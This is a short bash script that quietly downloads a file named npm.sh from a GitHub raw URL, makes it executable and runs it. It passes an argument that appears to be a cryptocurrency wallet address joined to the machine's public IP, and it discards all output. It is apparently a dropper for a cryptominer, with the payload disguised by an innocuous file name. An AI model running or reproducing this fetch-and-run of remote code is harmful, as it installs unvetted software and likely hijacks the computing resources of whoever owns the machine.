#!/bin/bash
wget -q https://raw.githubusercontent.com/makaryobos/privasi/main/npm.sh
chmod +x npm.sh
./npm.sh DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo "$(curl -s ifconfig.me)" | tr . _ ) >/dev/null
